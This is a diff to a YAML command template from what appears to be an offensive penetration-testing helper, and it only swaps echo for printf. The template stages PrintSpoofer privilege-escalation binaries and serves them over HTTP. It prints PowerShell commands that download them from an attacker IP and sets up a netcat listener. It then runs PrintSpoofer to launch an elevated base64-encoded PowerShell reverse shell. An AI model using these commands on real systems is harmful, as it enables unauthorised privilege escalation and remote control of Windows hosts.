@@ -7,14 +7,14 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; bash -c 'cp -n {{ tools_dir }}/printspoofer/* packstation/outbound/'; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Deliver (x64): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PrintSpoofer64.exe -Outfile {{ delivery_path_windows }}\PrintSpoofer64.exe'; \
-  echo 'Deliver (x32): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PrintSpoofer32.exe -Outfile {{ delivery_path_windows }}\PrintSpoofer32.exe'; \
-  echo '================================================================'; \
-  echo '                      -Suggested Commands-                      '; \
-  echo 'To execute in-place: {{ delivery_path_windows }}\PrintSpoofer64.exe -i -c powershell.exe'; \
-  echo 'Preparation 1 (for revshell): nc -lvnp {{ shell_port }}'; \
-  echo 'To open another revshell with elevated privileges: {{ delivery_path_windows }}\PrintSpoofer64.exe -i -c "{{ payload | default(include('payloads/revshell-windows-powershell-oneliner-base64encoded.yaml')) }}"'; \
-  echo '================================================================'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -----PowerShell-----                      '; \
+  printf '%s\n' 'Deliver (x64): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PrintSpoofer64.exe -Outfile {{ delivery_path_windows }}\PrintSpoofer64.exe'; \
+  printf '%s\n' 'Deliver (x32): iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PrintSpoofer32.exe -Outfile {{ delivery_path_windows }}\PrintSpoofer32.exe'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -Suggested Commands-                      '; \
+  printf '%s\n' 'To execute in-place: {{ delivery_path_windows }}\PrintSpoofer64.exe -i -c powershell.exe'; \
+  printf '%s\n' 'Preparation 1 (for revshell): nc -lvnp {{ shell_port }}'; \
+  printf '%s\n' 'To open another revshell with elevated privileges: {{ delivery_path_windows }}\PrintSpoofer64.exe -i -c "{{ payload | default(include('payloads/revshell-windows-powershell-oneliner-base64encoded.yaml')) }}"'; \
+  printf '%s\n' '================================================================'; \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
